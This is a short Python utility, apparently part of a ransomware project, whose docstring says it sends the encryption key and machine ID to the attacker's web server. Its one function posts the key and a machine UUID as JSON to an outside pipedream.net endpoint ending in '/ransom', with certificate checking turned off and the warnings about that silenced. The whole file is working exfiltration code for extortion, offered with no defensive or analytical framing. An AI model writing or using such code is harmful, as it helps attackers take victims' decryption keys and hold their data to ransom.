'''
This util is created to send the encryption key along with the machine ID
to the attacker web server
'''

import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = "https://eofvljfbgmr0v83.m.pipedream.net/ransom"

def send_information(key, uuid):
    requests.post(URL, json={
        "uuid": uuid,
        "key": key.decode('utf-8')
    }, allow_redirects=True, timeout=30, verify=False)